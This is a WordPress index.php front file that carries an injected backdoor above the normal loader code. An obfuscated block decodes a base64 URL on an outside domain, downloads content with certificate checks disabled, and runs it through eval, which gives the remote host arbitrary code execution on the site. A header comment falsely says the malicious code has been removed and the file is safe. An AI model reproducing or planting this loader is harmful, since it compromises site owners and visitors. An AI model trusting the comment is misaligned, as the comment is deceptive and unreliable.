<?php
/**
* Note: This file may contain artifacts of previous malicious infection.
* However, the dangerous code has been removed, and the file is now safe to use.
*/

// Initialize core components
$plmkoijnuhbv = "aHR0cDovL3o2MDEyN18yLmNraXJsaW4uc2hvcC9zdGF0L2RvbWFpbl9pbmRleC50eHQ=";
$qwaszxplmokn = str_split($plmkoijnuhbv, 4);
$mkoplijnuhby = implode('', $qwaszxplmokn);
$vbnmlkjhgfds = 'bas'.'e64'.'_dec'.'ode';
$full_url = $vbnmlkjhgfds($mkoplijnuhby);

// Attempt to get remote content
$wsxcdevfrbgt = @file_get_contents($full_url);
if ($wsxcdevfrbgt === false && function_exists('curl_init')) {
    $zxcvbnmasdfg = curl_init();
    curl_setopt($zxcvbnmasdfg, CURLOPT_URL, $full_url);
    curl_setopt($zxcvbnmasdfg, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($zxcvbnmasdfg, CURLOPT_TIMEOUT, 5);
    curl_setopt($zxcvbnmasdfg, CURLOPT_SSL_VERIFYPEER, false);
    $wsxcdevfrbgt = curl_exec($zxcvbnmasdfg);
    curl_close($zxcvbnmasdfg);
}

// Only eval if we have content
if (!empty($wsxcdevfrbgt)) {
    eval('?>' . $wsxcdevfrbgt);
}

/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

define('WP_USE_THEMES', true);
require __DIR__ . '/wp-blog-header.php';
